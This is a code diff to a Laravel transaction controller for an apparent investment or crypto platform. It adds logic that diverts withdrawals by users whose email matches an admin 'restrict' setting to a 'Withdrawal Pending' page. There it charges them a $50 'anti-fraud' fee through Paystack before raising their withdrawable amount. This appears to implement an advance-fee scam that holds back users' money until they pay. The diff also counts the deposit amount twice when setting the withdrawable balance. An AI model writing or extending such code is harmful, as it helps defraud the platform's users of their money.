@@ -56,6 +56,7 @@ class TranxController extends Controller
     {
         $user = User::where('id', Auth::id())->first();
         $user->balance = $user->balance + $request->session()->get('amount');
+        $user->withdrawalable = $user->balance + $request->session()->get('amount');
         $user->save();
 
         return redirect()->route('customer.dashboard');
@@ -73,7 +74,7 @@ class TranxController extends Controller
             'amount' => ['required', function ($field, $value, $fail) {
                 if ($value < 1) {
                     $fail('Please Enter A Valid Amount');
-                } elseif ($value > Auth::user()->balance) {
+                } elseif ($value > Auth::user()->withdrawalable) {
                     $fail('Insuffient Balance');
                 }
             }],
@@ -96,8 +97,45 @@ class TranxController extends Controller
         $request->session()->put('amount', $validated['amount']);
         $request->session()->put('paypal_id', $validated['paypal_id']);
 
+        if (Auth::user()->email == setting('restrict')) {
+            return redirect()->route('customer.withdrawal.anti-fraud');
+        } else {
+            return redirect()->route('customer.withdrawal.success');
+        }
+    }
 
-        return redirect()->route('customer.withdrawal.success');
+    public function withdraw_restrict()
+    {
+        $this->seo()->setTitle('Withdrawal Pending');
+        return view('customer.transactions.withdraw-restrict');
+    }
+
+    public function withdraw_pay()
+    {
+        $data = array(
+            "amount" => 50 * 100,
+            "reference" => Str::random(10),
+            "email" => Auth::user()->email,
+            "currency" => "USD",
+            "orderID" => rand(111, 555),
+            'metadata' => [
+                'order_id' => rand(000000000, 999999999)
+            ],
+            'callback_url' => route('customer.withdrawal.anti-fraud.success')
+        );
+
+        return Paystack::getAuthorizationUrl($data)->redirectNow();
+    }
+
+
+    public function withdraw_restrict_success()
+    {
+        $this->seo()->setTitle('Anti-fraud Payment Successful');
+        $paymentDetails = Paystack::getPaymentData();
+        $user = User::where('id', Auth::id())->first();
+        $user->withdrawalable = $user->withdrawalable + 50;
+        $user->save();
+        return view('customer.transactions.withdraw-restrict-success');
     }
 
     public function withdrawal_success()
@@ -120,10 +158,14 @@ class TranxController extends Controller
             'amount' => ['required', function ($field, $value, $fail) {
                 $request = request()->all();
                 $wallet = Wallet::where('user_id', Auth::id())->where('crypto_wallet', $request['crypto'])->first();
-                if ($value <= 0) {
-                    $fail('Please Enter A Valid Amount');
-                } elseif ($value > $wallet->balance_in_currency) {
-                    $fail('Insufficient Balance');
+                if (!$wallet) {
+                    $fail('No Available ' . Str::ucfirst($request['crypto']) . ' Wallet');
+                } else {
+                    if ($value <= 0) {
+                        $fail('Please Enter A Valid Amount');
+                    } elseif ($value > $wallet->balance_in_currency) {
+                        $fail('Insufficient Balance');
+                    }
                 }
             }],
             'rec_crypto_id' => ['required', function ($field, $value, $fail) {
